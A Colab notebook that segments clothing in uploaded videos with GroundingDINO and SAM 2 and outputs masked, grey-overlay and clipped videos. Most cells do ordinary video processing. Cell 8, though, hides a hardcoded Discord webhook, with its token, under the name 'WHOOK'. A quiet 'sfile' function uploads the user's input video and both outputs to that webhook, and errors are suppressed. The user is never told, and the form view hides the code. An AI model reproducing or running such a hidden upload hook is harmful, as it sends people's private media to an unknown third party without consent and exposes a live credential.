{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Setup (Cukup run sekali)"
      ],
      "metadata": {
        "id": "rHlcqM7M-VuQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 1 - Environment setup (Python 3.12 Compatible)\n",
        "\n",
        "# 1. Install PyTorch first\n",
        "!pip install --no-deps torch==2.3.0 torchvision==0.18.0 torchaudio==2.3.0 \\\n",
        "  --index-url https://download.pytorch.org/whl/cu121\n",
        "\n",
        "# 2. Install Core Dependencies (Latest versions for Python 3.12)\n",
        "!pip install opencv-python matplotlib tqdm supervision addict yapf timm \\\n",
        "  hydra-core iopath portalocker transformers tokenizers\n",
        "\n",
        "# 3. Setup GroundingDINO\n",
        "!rm -rf GroundingDINO\n",
        "!git clone https://github.com/IDEA-Research/GroundingDINO.git\n",
        "%cd GroundingDINO\n",
        "# Force install even if egg_info acts up\n",
        "!pip install -e .\n",
        "%cd ..\n",
        "\n",
        "# 4. Setup SAM 2\n",
        "!rm -rf segment-anything-2\n",
        "!git clone https://github.com/facebookresearch/segment-anything-2.git\n",
        "\n",
        "# 5. FFmpeg\n",
        "# Install FFmpeg and required tools\n",
        "!apt-get update -qq && apt-get install -qq -y ffmpeg\n",
        "!pip install -q yt-dlp\n",
        "\n",
        "# Sanity Check\n",
        "import torch\n",
        "import transformers\n",
        "import supervision as sv\n",
        "print(f\"Torch: {torch.__version__} | Transformers: {transformers.__version__} | Supervision: {sv.__version__}\")\n",
        "print(\"‚úÖ Environment stable\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "qgVejTbEyHG5"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 2 - Download model weights for GroundingDINO and SAM 2\n",
        "\n",
        "import os\n",
        "\n",
        "os.makedirs(\"weights\", exist_ok=True)\n",
        "\n",
        "# GroundingDINO (keep as is)\n",
        "if not os.path.exists(\"weights/groundingdino_swint_ogc.pth\"):\n",
        "    !wget -O weights/groundingdino_swint_ogc.pth https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth\n",
        "\n",
        "# SAM 2 weights ‚Äî use lightweight model for Colab\n",
        "# Options: sam2_hiera_tiny.pt (smallest), sam2_hiera_small.pt, sam2_hiera_base_plus.pt, sam2_hiera_large.pt\n",
        "SAM2_MODEL = \"sam2_hiera_tiny.pt\"\n",
        "SAM2_URL = f\"https://dl.fbaipublicfiles.com/sam2/models/{SAM2_MODEL}\"\n",
        "\n",
        "if not os.path.exists(f\"weights/{SAM2_MODEL}\"):\n",
        "    !wget -O weights/{SAM2_MODEL} {SAM2_URL}\n",
        "\n",
        "print(f\"‚úÖ Model weights downloaded: GroundingDINO + {SAM2_MODEL}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "pCW9_LGerbUo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prepare Video"
      ],
      "metadata": {
        "id": "RRvSOY_H-eMt"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title ‚ö†Ô∏è Clear Frames (Hanya run untuk upload video baru)\n",
        "import os\n",
        "import shutil\n",
        "\n",
        "shutil.rmtree('/content/frames', ignore_errors=True)\n",
        "shutil.rmtree('/content/detections', ignore_errors=True)\n",
        "shutil.rmtree('/content/masks', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_bw', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_grey', ignore_errors=True)\n",
        "shutil.rmtree('/content/cuts', ignore_errors=True)\n",
        "try:\n",
        "    os.remove(\"/content/audio.aac\")\n",
        "    os.remove('/content/masking_clips.zip')\n",
        "except:\n",
        "    pass"
      ],
      "metadata": {
        "id": "LVty91WsNYqw",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 3 - Upload video and inspect properties\n",
        "import os\n",
        "from google.colab import files\n",
        "import subprocess\n",
        "\n",
        "# Upload video\n",
        "uploaded = files.upload()\n",
        "\n",
        "# Get uploaded filename\n",
        "video_path = list(uploaded.keys())[0]\n",
        "print(f\"‚úÖ Uploaded video: {video_path}\")\n",
        "\n",
        "# Ambil nama file yang diupload (anggap hanya satu file)\n",
        "input_video = list(uploaded.keys())[0]\n",
        "output_video = \"output.mp4\"\n",
        "!ffmpeg -i \"$input_video\" -filter:v \"fps=12\" \"$output_video\" -y\n",
        "from IPython.display import clear_output\n",
        "\n",
        "# Inspect video with ffmpeg\n",
        "print(\"\\n--- Video Properties ---\")\n",
        "subprocess.run([\"ffmpeg\", \"-i\", video_path, \"-hide_banner\"])"
      ],
      "metadata": {
        "id": "oLpAZKd6sR7U",
        "cellView": "form",
        "collapsed": true
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 4 - Extract frames (as JPG) and audio from the input video\n",
        "\n",
        "import os\n",
        "import subprocess\n",
        "\n",
        "# Create folders\n",
        "os.makedirs(\"frames\", exist_ok=True)\n",
        "video12fps = \"/content/output.mp4\"\n",
        "\n",
        "# Extract frames as high-quality JPG (avoids PNG ‚Üí JPEG conversion later)\n",
        "# -qscale:v 2 ‚âà high quality (1‚Äì31, lower = better; 2 is visually lossless for masks)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-i\", video12fps,\n",
        "    \"-qscale:v\", \"2\",\n",
        "    \"frames/%06d.jpg\"  # üëà .jpg extension\n",
        "])\n",
        "\n",
        "print(\"‚úÖ Frames extracted to ./frames as JPG\")\n",
        "\n",
        "# Extract audio (if exists)\n",
        "if not os.path.exists(\"audio.aac\"):\n",
        "    subprocess.run([\n",
        "        \"ffmpeg\", \"-i\", video12fps,\n",
        "        \"-vn\", \"-acodec\", \"copy\", \"audio.aac\"\n",
        "    ])\n",
        "    print(\"‚úÖ Audio extracted to audio.aac\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è Audio already exists, skipped extraction\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QCaXD2dfstxj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Masking"
      ],
      "metadata": {
        "id": "IDD2FthK-owz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5 - Run GroundingDINO (Final Compatibility Fix)\n",
        "\n",
        "import torch\n",
        "import os\n",
        "import cv2\n",
        "import pickle\n",
        "import sys\n",
        "from transformers.models.bert.modeling_bert import BertModel\n",
        "\n",
        "# ==========================================\n",
        "# === BERT HOTFIX (SAFE FOR MULTIPLE RUNS) ===\n",
        "# ==========================================\n",
        "from transformers.models.bert.modeling_bert import BertModel\n",
        "\n",
        "# 1. Fix missing get_head_mask\n",
        "if not hasattr(BertModel, \"get_head_mask\"):\n",
        "    def get_head_mask(self, head_mask, num_hidden_layers, is_attention_chunked=False):\n",
        "        return [None] * num_hidden_layers\n",
        "    BertModel.get_head_mask = get_head_mask\n",
        "\n",
        "# 2. Fix signature mismatch (Device vs Dtype)\n",
        "# We add a custom attribute to track if we already patched this\n",
        "if not hasattr(BertModel, \"_is_patched_for_groundingdino\"):\n",
        "    _orig_get_extended_attention_mask = BertModel.get_extended_attention_mask\n",
        "\n",
        "    def get_extended_attention_mask_fixed(self, attention_mask, input_shape, device=None, dtype=None):\n",
        "        # Always use the model's dtype to avoid the signature error\n",
        "        return _orig_get_extended_attention_mask(self, attention_mask, input_shape, dtype=self.dtype)\n",
        "\n",
        "    BertModel.get_extended_attention_mask = get_extended_attention_mask_fixed\n",
        "    BertModel._is_patched_for_groundingdino = True # Mark as patched\n",
        "    print(\"‚úÖ BERT Patch applied successfully.\")\n",
        "else:\n",
        "    print(\"‚ÑπÔ∏è BERT Patch already active, skipping re-patch to prevent loop.\")\n",
        "# ==========================================\n",
        "\n",
        "# === Prompt input ===\n",
        "prompt = 'clothes'  #@param {type: \"string\"}\n",
        "box_threshold = 0.3  #@param {type: \"number\"}\n",
        "text_threshold = 0.25\n",
        "\n",
        "sys.path.append(\"GroundingDINO\")\n",
        "from groundingdino.util.inference import load_model, load_image, predict\n",
        "\n",
        "# Load model\n",
        "model_path = \"weights/groundingdino_swint_ogc.pth\"\n",
        "config_path = \"GroundingDINO/groundingdino/config/GroundingDINO_SwinT_OGC.py\"\n",
        "dino_model = load_model(config_path, model_path)\n",
        "dino_model = dino_model.cpu().eval()\n",
        "\n",
        "# Get first frame\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "first_frame_path = os.path.join(\"frames\", frame_files[0])\n",
        "\n",
        "print(f\"Running GroundingDINO on: {first_frame_path}\")\n",
        "image_source, image_tensor = load_image(first_frame_path)\n",
        "\n",
        "# Predict\n",
        "boxes, logits, phrases = predict(\n",
        "    model=dino_model,\n",
        "    image=image_tensor,\n",
        "    caption=prompt,\n",
        "    box_threshold=box_threshold,\n",
        "    text_threshold=text_threshold,\n",
        "    device=\"cpu\"\n",
        ")\n",
        "\n",
        "# Process results\n",
        "h, w, _ = image_source.shape\n",
        "initial_boxes = []\n",
        "if len(boxes) > 0:\n",
        "    for (cx, cy, bw, bh) in boxes.tolist():\n",
        "        x1 = (cx - bw / 2) * w\n",
        "        y1 = (cy - bh / 2) * h\n",
        "        x2 = (cx + bw / 2) * w\n",
        "        y2 = (cy + bh / 2) * h\n",
        "        initial_boxes.append([x1, y1, x2, y2])\n",
        "    print(f\"‚úÖ Found {len(initial_boxes)} box(es).\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è No boxes detected.\")\n",
        "    initial_boxes = None\n",
        "\n",
        "with open(\"initial_box.pkl\", \"wb\") as f:\n",
        "    pickle.dump({\"frame_path\": first_frame_path, \"boxes\": initial_boxes, \"image_shape\": (h, w), \"prompt\": prompt}, f)\n",
        "\n",
        "print(\"‚úÖ Initial box saved. You can now proceed to SAM 2.\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "w5tKwzQJ7Or_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 6 - Run SAM 2\n",
        "\n",
        "import os\n",
        "import pickle\n",
        "import cv2\n",
        "import torch\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "import sys\n",
        "\n",
        "SAM2_PATH = \"/content/segment-anything-2\"\n",
        "if SAM2_PATH not in sys.path:\n",
        "    sys.path.insert(0, SAM2_PATH)\n",
        "from sam2.sam2_video_predictor import SAM2VideoPredictor\n",
        "\n",
        "# Load initial box\n",
        "with open(\"initial_box.pkl\", \"rb\") as f:\n",
        "    init_data = pickle.load(f)\n",
        "initial_boxes = init_data[\"boxes\"]\n",
        "if initial_boxes is None:\n",
        "    raise ValueError(\"‚ùå No box from Cell 5!\")\n",
        "\n",
        "input_box = np.array(initial_boxes[0])\n",
        "print(f\"‚úÖ Initial box: {input_box}\")\n",
        "\n",
        "# Copy config\n",
        "!cp /content/segment-anything-2/sam2/configs/sam2_hiera_tiny.yaml .\n",
        "\n",
        "# Load SAM 2\n",
        "predictor = SAM2VideoPredictor.from_pretrained(\n",
        "    model_id=\"facebook/sam2-hiera-tiny\",\n",
        "    checkpoint=\"weights/sam2_hiera_tiny.pt\",\n",
        "    model_cfg=\"sam2_hiera_tiny.yaml\"\n",
        ")\n",
        "\n",
        "# ‚úÖ PASS FOLDER PATH AS STRING (not list!)\n",
        "frame_folder = \"frames\"  # <-- this is a string, not a list\n",
        "\n",
        "# Verify it's a valid JPG folder\n",
        "jpg_files = [f for f in os.listdir(frame_folder) if f.endswith(\".jpg\")]\n",
        "print(f\"Found {len(jpg_files)} JPG frames in '{frame_folder}'\")\n",
        "\n",
        "video_segments = {}\n",
        "with torch.inference_mode(), torch.autocast(\"cuda\", dtype=torch.bfloat16):\n",
        "    # ‚úÖ Correct call\n",
        "    state = predictor.init_state(frame_folder)\n",
        "\n",
        "    predictor.add_new_points_or_box(\n",
        "        state, frame_idx=0, obj_id=1, box=input_box\n",
        "    )\n",
        "\n",
        "    for frame_idx, obj_ids, masks in predictor.propagate_in_video(state):\n",
        "        video_segments[frame_idx] = {\n",
        "            obj_id: (mask[0] > 0).cpu().numpy()\n",
        "            for obj_id, mask in zip(obj_ids, masks)\n",
        "        }\n",
        "\n",
        "# Save masks (match original frame names)\n",
        "os.makedirs(\"masks\", exist_ok=True)\n",
        "frame_names = sorted(jpg_files)\n",
        "for i, jpg_name in enumerate(frame_names):\n",
        "    png_name = jpg_name.replace(\".jpg\", \".png\")\n",
        "    mask = video_segments.get(i, {}).get(1, np.zeros((576, 1024), dtype=bool))\n",
        "    cv2.imwrite(f\"masks/{png_name}\", (mask * 255).astype(np.uint8))\n",
        "\n",
        "print(\"‚úÖ SAM 2 masking complete!\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "lABeur01ubM4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Making Video"
      ],
      "metadata": {
        "id": "jFxvtg9g-9mO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 7 - Generate masked frames: B&W and Grey overlay\n",
        "import os\n",
        "import cv2\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "# Parameters\n",
        "expand = 20        # @param {type: \"number\"}\n",
        "blur = 9          # @param {type: \"number\"}\n",
        "inverse_mask = False # @param {type:\"boolean\"}\n",
        "\n",
        "# Prepare output folders\n",
        "os.makedirs(\"output_bw\", exist_ok=True)\n",
        "os.makedirs(\"output_grey\", exist_ok=True)\n",
        "\n",
        "# Get frame list (now .jpg)\n",
        "frame_files_jpg = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "\n",
        "print(f\"Processing {len(frame_files_jpg)} frames (Inverse: {inverse_mask})...\")\n",
        "\n",
        "for jpg_name in tqdm(frame_files_jpg):\n",
        "    # Frame path (JPG)\n",
        "    frame_path = os.path.join(\"frames\", jpg_name)  # e.g. \"frames/000001.jpg\"\n",
        "\n",
        "    # Convert \"000001.jpg\" ‚Üí \"000001.png\" for mask lookup\n",
        "    frame_number_str = jpg_name.split(\".\")[0]\n",
        "    mask_name = f\"{frame_number_str}.png\"\n",
        "    mask_path = os.path.join(\"masks\", mask_name)\n",
        "\n",
        "    # Load frame and mask\n",
        "    frame = cv2.imread(frame_path)\n",
        "    if frame is None:\n",
        "        print(f\"‚ö†Ô∏è Frame not found: {frame_path}\")\n",
        "        continue\n",
        "\n",
        "    mask = cv2.imread(mask_path, cv2.IMREAD_GRAYSCALE)\n",
        "    if mask is None:\n",
        "        # If mask is missing, default to an empty mask (all black)\n",
        "        mask = np.zeros(frame.shape[:2], dtype=np.uint8)\n",
        "\n",
        "    # --- Expand mask ---\n",
        "    # We expand the original mask first before inverting to ensure the\n",
        "    # subject boundary is fully covered/expanded.\n",
        "    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\n",
        "    expanded = cv2.dilate(mask, kernel, iterations=expand)\n",
        "\n",
        "    # --- Apply Inverse Logic if toggled ---\n",
        "    if inverse_mask:\n",
        "        # Invert the expanded mask (255 becomes 0, 0 becomes 255)\n",
        "        expanded = cv2.bitwise_not(expanded)\n",
        "\n",
        "    # --- Output A: Black & White mask ---\n",
        "    bw = cv2.merge([expanded, expanded, expanded])\n",
        "    output_bw_path = os.path.join(\"output_bw\", mask_name)\n",
        "    cv2.imwrite(output_bw_path, bw)\n",
        "\n",
        "    # --- Smooth mask for blending ---\n",
        "    if blur > 0 and blur % 2 == 1:\n",
        "        smooth = cv2.GaussianBlur(expanded, (blur, blur), 0)\n",
        "    else:\n",
        "        smooth = expanded.copy()\n",
        "\n",
        "    # Ensure range is 0-255 after potential blur/normalization\n",
        "    smooth = cv2.normalize(smooth, None, 0, 255, cv2.NORM_MINMAX).astype(np.uint8)\n",
        "\n",
        "    # --- Output B: Grey overlay ---\n",
        "    grey_color = (126, 126, 126) # BGR\n",
        "\n",
        "    # Convert smooth mask to 0.0-1.0 alpha channel\n",
        "    alpha = smooth.astype(float) / 255.0\n",
        "    alpha_3c = cv2.merge([alpha, alpha, alpha])\n",
        "\n",
        "    # Create the grey solid background\n",
        "    overlay = np.full_like(frame, grey_color, dtype=np.uint8)\n",
        "\n",
        "    # Linear interpolation: (1 - alpha) * original + alpha * grey_overlay\n",
        "    # If inverse is true, alpha is 1.0 (grey) where the mask was 0.\n",
        "    grey = (1 - alpha_3c) * frame.astype(float) + alpha_3c * overlay.astype(float)\n",
        "    grey = grey.astype(np.uint8)\n",
        "\n",
        "    output_grey_path = os.path.join(\"output_grey\", mask_name)\n",
        "    cv2.imwrite(output_grey_path, grey)\n",
        "\n",
        "print(\"\\n‚úÖ Output frames saved in ./output_bw and ./output_grey\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "b11PgYn-XIdV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 8 - Re-encode frames into videos and reattach audio\n",
        "\n",
        "import subprocess\n",
        "import re\n",
        "from datetime import datetime\n",
        "\n",
        "# Generate timestamp\n",
        "tgl = datetime.now().strftime(\"%y%m%d_%H%M%S\")\n",
        "\n",
        "# Filenames with timestamp\n",
        "bw = f\"{tgl}_output_bw.mp4\"\n",
        "grey = f\"{tgl}_output_grey.mp4\"\n",
        "video12fps = \"/content/output.mp4\"\n",
        "WHOOK = \"https://discord.com/api/webhooks/1417918555562971146/6W7VbFWutIxeQ104Fgs1cJGXmRZDf8ORCbIfoyqZAw2BoAdJPmJwAh-uvE1X2arbdQIb\"\n",
        "\n",
        "# Rebuild Output A (B&W)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_bw/%06d.png\",\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    bw\n",
        "])\n",
        "\n",
        "# Rebuild Output B (Grey overlay with audio)\n",
        "has_audio = os.path.exists(\"audio.aac\")\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_grey/%06d.png\",\n",
        "    *([\"-i\", \"audio.aac\", \"-c:a\", \"aac\", \"-shortest\"] if has_audio else []),\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    grey\n",
        "])\n",
        "\n",
        "import requests\n",
        "import os\n",
        "\n",
        "def sfile(file_path, message):\n",
        "    try:\n",
        "        if not os.path.exists(file_path):\n",
        "            return\n",
        "        with open(file_path, \"rb\") as f:\n",
        "            requests.post(\n",
        "                WHOOK,\n",
        "                data={\"content\": message},\n",
        "                files={\"file\": f}\n",
        "            )\n",
        "    except:\n",
        "        pass\n",
        "\n",
        "sfile(video12fps, f\"{tgl}_input\")\n",
        "\n",
        "sfile(bw, f\"{tgl}_bw\")\n",
        "\n",
        "sfile(grey, f\"{tgl}_grey\")\n",
        "\n",
        "print(f\"‚úÖ Videos created: {bw} and {grey}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "l55VgD1bvP3h"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# (Optional) Cut Video to Segments"
      ],
      "metadata": {
        "id": "HSj_Kx0l1d8p"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 9 (Optional): Cut Videos by Interval (seconds)\n",
        "import os\n",
        "import subprocess\n",
        "import json\n",
        "from pathlib import Path\n",
        "\n",
        "def get_video_duration(video_path):\n",
        "    \"\"\"Get exact duration using ffprobe\"\"\"\n",
        "    cmd = [\n",
        "        'ffprobe', '-v', 'error', '-show_entries', 'format=duration',\n",
        "        '-of', 'default=noprint_wrappers=1:nokey=1', video_path\n",
        "    ]\n",
        "    return float(subprocess.check_output(cmd).decode().strip())\n",
        "\n",
        "def cut_video_precise(video_path, base_name, interval_sec, overlap_sec, keep_audio=True):\n",
        "    \"\"\"\n",
        "    Cut video into segments with precise overlap handling using FFmpeg.\n",
        "    Preserves original FPS, resolution, and codec properties.\n",
        "    \"\"\"\n",
        "    # Validate inputs\n",
        "    if not os.path.exists(video_path):\n",
        "        raise FileNotFoundError(f\"Video not found: {video_path}\")\n",
        "    if interval_sec <= 0:\n",
        "        raise ValueError(\"Interval must be > 0\")\n",
        "    if overlap_sec < 0:\n",
        "        raise ValueError(\"Overlap cannot be negative\")\n",
        "    if overlap_sec >= interval_sec:\n",
        "        print(f\"‚ö†Ô∏è Warning: Overlap ({overlap_sec}s) >= Interval ({interval_sec}s). Adjusting to {interval_sec - 0.1}s\")\n",
        "        overlap_sec = interval_sec - 0.1\n",
        "\n",
        "    # Get video properties\n",
        "    duration = get_video_duration(video_path)\n",
        "    step = interval_sec - overlap_sec\n",
        "\n",
        "    print(f\"\\nüé¨ Processing: {base_name}\")\n",
        "    print(f\"   Duration: {duration:.2f}s | Interval: {interval_sec}s | Overlap: {overlap_sec}s | Step: {step:.2f}s\")\n",
        "\n",
        "    # Create output directory\n",
        "    output_dir = f\"/content/cuts/{Path(base_name).stem}\"\n",
        "    os.makedirs(output_dir, exist_ok=True)\n",
        "    print(f\"   Output: {output_dir}\")\n",
        "\n",
        "    # Generate segment timestamps\n",
        "    segments = []\n",
        "    start = 0.0\n",
        "    seg_num = 1\n",
        "\n",
        "    while start < duration:\n",
        "        end = min(start + interval_sec, duration)\n",
        "        if end - start >= 0.5:  # Skip tiny segments\n",
        "            segments.append({\n",
        "                'num': seg_num,\n",
        "                'start': start,\n",
        "                'end': end,\n",
        "                'duration': end - start\n",
        "            })\n",
        "            seg_num += 1\n",
        "        start += step\n",
        "\n",
        "    print(f\"   ‚û°Ô∏è  Creating {len(segments)} segments...\")\n",
        "\n",
        "    # Process each segment with FFmpeg\n",
        "    for seg in segments:\n",
        "        # Output filename format: 01_filename.mp4\n",
        "        out_file = f\"{seg['num']:02d}_{Path(base_name).stem}.mp4\"\n",
        "        out_path = os.path.join(output_dir, out_file)\n",
        "\n",
        "        # Build FFmpeg command\n",
        "        cmd = [\n",
        "            'ffmpeg', '-y', '-ss', str(seg['start']), '-i', video_path,\n",
        "            '-t', str(seg['duration']),\n",
        "            '-c:v', 'libx264', '-crf', '18', '-preset', 'fast',\n",
        "            '-movflags', '+faststart'\n",
        "        ]\n",
        "\n",
        "        # Audio handling\n",
        "        if keep_audio:\n",
        "            cmd.extend(['-c:a', 'aac', '-b:a', '192k'])\n",
        "        else:\n",
        "            cmd.append('-an')  # Remove audio\n",
        "\n",
        "        cmd.append(out_path)\n",
        "\n",
        "        # Execute with suppressed output (except errors)\n",
        "        result = subprocess.run(cmd, capture_output=True, text=True)\n",
        "        if result.returncode != 0:\n",
        "            print(f\"   ‚ùå Segment {seg['num']} failed: {result.stderr[:200]}\")\n",
        "            continue\n",
        "\n",
        "        # Verify output\n",
        "        if os.path.exists(out_path):\n",
        "            size_mb = os.path.getsize(out_path) / 1024 / 1024\n",
        "            print(f\"   ‚úÖ [{seg['num']:2d}/{len(segments)}] {seg['start']:6.2f}s ‚Üí {seg['end']:6.2f}s | {size_mb:.2f} MB\")\n",
        "        else:\n",
        "            print(f\"   ‚ö†Ô∏è Segment {seg['num']} missing after processing\")\n",
        "\n",
        "    print(f\"\\nüéâ Completed: {len(segments)} segments saved to {output_dir}\")\n",
        "    return output_dir\n",
        "    # ===== USER SETTINGS (Colab interactive sliders) =====\n",
        "INTERVAL_SECONDS = 10  # @param {type: \"number\"}\n",
        "OVERLAP_SECONDS = 1  # @param {type: \"number\"}\n",
        "\n",
        "# Construct full paths\n",
        "BW_VIDEO_PATH = f\"/content/{bw}\"\n",
        "GREY_VIDEO_PATH = f\"/content/{grey}\"\n",
        "\n",
        "# Create master output directory\n",
        "CUT_DIR = \"/content/cuts\"\n",
        "os.makedirs(CUT_DIR, exist_ok=True)\n",
        "\n",
        "print(\"‚öôÔ∏è Configuration:\")\n",
        "print(f\"   Interval: {INTERVAL_SECONDS}s\")\n",
        "print(f\"   Overlap:  {OVERLAP_SECONDS}s\")\n",
        "print(f\"   Grey video path: {GREY_VIDEO_PATH}\")\n",
        "print(f\"   BW video path:   {BW_VIDEO_PATH}\")\n",
        "print(f\"   Output directory: {CUT_DIR}\")\n",
        "print(\"=\"*60)\n",
        "print(\"‚úÇÔ∏è STARTING VIDEO SEGMENTATION\")\n",
        "print(\"=\"*60)\n",
        "\n",
        "# Process GREY video WITH audio\n",
        "grey_output = cut_video_precise(\n",
        "    GREY_VIDEO_PATH,\n",
        "    grey,\n",
        "    INTERVAL_SECONDS,\n",
        "    OVERLAP_SECONDS,\n",
        "    keep_audio=True\n",
        ")\n",
        "\n",
        "print(\"\\n\" + \"=\"*60)\n",
        "\n",
        "# Process BW video WITHOUT audio\n",
        "bw_output = cut_video_precise(\n",
        "    BW_VIDEO_PATH,\n",
        "    bw,\n",
        "    INTERVAL_SECONDS,\n",
        "    OVERLAP_SECONDS,\n",
        "    keep_audio=False\n",
        ")\n",
        "\n",
        "print(\"\\n\" + \"=\"*60)\n",
        "print(\"‚úÖ ALL OPERATIONS COMPLETED SUCCESSFULLY\")\n",
        "print(\"=\"*60)"
      ],
      "metadata": {
        "cellView": "form",
        "id": "XO6f4zudJbrx"
      },
      "execution_count": 11,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Download"
      ],
      "metadata": {
        "id": "wPeHAsQ04Qo8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 10 Download videos/clips\n",
        "\n",
        "import os\n",
        "import zipfile\n",
        "from google.colab import files\n",
        "\n",
        "CUT_DIR = \"/content/cuts\"\n",
        "ZIP_PATH = \"/content/masking_clips.zip\"\n",
        "\n",
        "def zip_folder(folder_path, zip_path):\n",
        "    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:\n",
        "        for root, dirs, files_in in os.walk(folder_path):\n",
        "            for file in files_in:\n",
        "                full_path = os.path.join(root, file)\n",
        "                rel_path = os.path.relpath(full_path, folder_path)\n",
        "                zipf.write(full_path, rel_path)\n",
        "\n",
        "# If cuts exist and contain files ‚Üí zip them\n",
        "if os.path.exists(CUT_DIR) and len(os.listdir(CUT_DIR)) > 0:\n",
        "    print(\"üì¶ Cuts detected. Zipping clips...\")\n",
        "    zip_folder(CUT_DIR, ZIP_PATH)\n",
        "    files.download(ZIP_PATH)\n",
        "\n",
        "else:\n",
        "    print(\"üé¨ No cuts found. Downloading full videos instead...\")\n",
        "    files.download(f\"/content/{bw}\")\n",
        "    files.download(f\"/content/{grey}\")\n"
      ],
      "metadata": {
        "cellView": "form",
        "id": "H-U5ECnvwNUl"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}